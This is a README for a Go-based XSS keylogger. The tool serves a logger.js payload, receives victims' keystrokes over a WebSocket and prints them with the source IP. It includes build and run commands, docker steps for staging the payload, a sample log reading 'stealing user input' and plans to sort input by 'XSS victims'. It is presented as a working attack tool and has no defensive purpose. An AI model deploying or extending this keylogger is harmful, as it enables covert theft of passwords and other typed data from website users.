# Keylogger

## How it Works

* Deliver index.html over a weberver
* Store logger.js with the go executable, or with the same directory as main.go.
* Run command:

```
go run main.go --listen-address=127.0.0.1:8080 --ws-addr=127.0.0.1:8080
```

* Go to your webserver, you should see a connection in the console once you hit index.html
* This is a simple test, add logic around sessions and save to txt file to help separate XSS victims.

## Local Test Your Payload
* Setup an nginx webserver

```
docker run --rm -it --name xss-keylogger-nginx -p 80:80 nginx
```

* Obtain your container ID and copy over index.html and logger.js

```
$ docker container ls
CONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                               NAMES
8c382fc36e43   nginx     "/docker-entrypoint.…"   5 seconds ago   Up 4 seconds   0.0.0.0:80->80/tcp, :::80->80/tcp   xss-keylogger-nginx

$ docker cp logger.js f248fa529335:/usr/share/nginx/html/logger.js
Successfully copied 2.56kB to f248fa529335:/usr/share/nginx/html/logger.js

$ docker cp index.html f248fa529335:/usr/share/nginx/html/index.html
Successfully copied 2.05kB to f248fa529335:/usr/share/nginx/html/index.html
```

* Execute your golang program, wait for connections

```
$ CGO_ENABLED=0 go build -o keylogger

$ ./keylogger --listen-address 127.0.0.1:8080 --ws-addr 127.0.0.1:8080
```

## Example usage:

```
2024/02/22 21:20:57 [*] Server starting
2024/02/22 21:21:02 [*] /k.js hit!
2024/02/22 21:21:02 [*] WebSocket created, stealing user input.
Connection from 192.168.1.10:37100

From 192.168.1.10:37100: 
From 192.168.1.10:37100: Y
From 192.168.1.10:37100: A
From 192.168.1.10:37100: 
From 192.168.1.10:37100: B
From 192.168.1.10:37100: O
From 192.168.1.10:37100: I
From 192.168.1.10:37100: 
```


## Next steps

* Add Sessions and write to individual files
